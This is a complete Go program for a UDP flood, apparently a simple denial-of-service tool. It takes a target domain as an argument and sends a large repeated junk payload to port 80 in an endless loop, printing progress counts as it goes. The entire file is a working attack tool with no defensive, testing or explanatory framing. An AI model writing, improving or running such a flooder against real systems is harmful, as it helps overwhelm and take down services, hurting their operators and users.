package main

import (
	"fmt"
	"net"
	"os"
)

var payload = "rFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAXeNSaHbSYfoTrFAX"

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Target domain is missing")
		return
	}

	domain := fmt.Sprintf("%s:80", os.Args[1])
	fmt.Printf("Start UDP flood for: %s\n", domain)

	conn, err := net.Dial("udp", domain)
	if err != nil {
		fmt.Printf("Connection error %v", err)
		return
	}

	i := 0

	for {
		if i > 0 && i%10 == 0 {
			fmt.Printf("Sent %d requests\n", i)
		}

		_, err := fmt.Fprintf(conn, "%s", payload)
		if err != nil {
			fmt.Println("Request cannot be send")
			return
		}
		i++
	}

	conn.Close()
}
